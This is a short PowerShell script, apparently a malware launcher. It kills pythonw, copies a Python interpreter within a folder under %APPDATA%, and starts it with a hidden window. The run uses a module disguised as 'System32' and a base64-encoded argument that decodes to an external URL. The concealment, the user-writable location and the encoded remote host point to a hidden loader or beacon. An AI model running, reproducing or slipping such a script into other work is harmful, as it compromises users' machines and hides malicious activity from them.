Stop-Process -Name pythonw -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
Copy-Item -Path "$env:APPDATA\python313\Lib\pythonw.exe" -Destination "$env:APPDATA\python313\pythonw.exe" -Force
Start-Process -FilePath "$env:APPDATA\python313\pythonw.exe" -ArgumentList "-m System32 aHR0cDovL3d3dy5tYXN0ZXJkZXYuaW5kZXZzLmluQEAwLTAtMA==" -WindowStyle Hidden